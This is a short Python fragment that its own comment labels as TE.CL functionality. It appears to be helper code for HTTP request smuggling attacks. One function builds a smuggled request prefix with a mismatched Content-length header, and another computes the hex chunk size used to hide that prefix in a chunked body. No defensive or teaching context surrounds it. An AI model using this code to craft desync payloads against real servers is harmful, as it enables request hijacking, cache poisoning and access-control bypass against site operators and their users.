import re

#Define some global variables
RN = '\n'

# TE.CL functionality
def PREFIX(HOSTNAME, ACTION, REQUEST_METHOD):
#You can add more HTTP headers for ur purpose
    PREF = "{} /{} HTTP/1.1".format(REQUEST_METHOD, ACTION) + RN 
    PREF += "Host: {}".format(HOSTNAME) + RN
    PREF += "Content-Type: application/x-www-form-urlencoded" + RN
    PREF += "Content-length: 15" + RN
    PREF += "x=1" + RN


    if '\r' not in PREF:
        PREF = PREF.replace('\n', '\r\n')

    return PREF


def CHUNK_CALC(PREF):
    CHUNK = hex(len(PREF)).lstrip("0x")

    return CHUNK